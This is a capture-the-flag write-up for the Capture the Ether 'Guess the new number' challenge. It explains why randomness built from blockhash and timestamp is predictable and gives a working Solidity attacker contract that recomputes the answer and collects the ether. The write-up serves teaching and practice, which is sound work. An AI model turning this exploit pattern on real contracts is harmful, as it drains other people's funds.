# Guess the new number Capturetheether

## Goals

=> Guess the number which is now generated on-demand when a guess is made.

### Solution

- No randomness given since when you call the guess function from another contract you have easy access to the block.number and the block.timestamp and can just copy paste the method that calculates the "random" answer and use that to call the Guess contract with another contract that just calculated the answer and it will be 100% right every time

### Attacker Contract

```solidity
contract Hack {
    GuessTheNewNumberChallenge guessContract;

    constructor(address _guessContract) {
        guessContract = GuessTheNewNumberChallenge(_guessContract);
    }

    receive() external payable {}

    function attack() public payable {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        require(msg.value == 1 ether, "You must send an ether, first");
        guessContract.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    function showBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
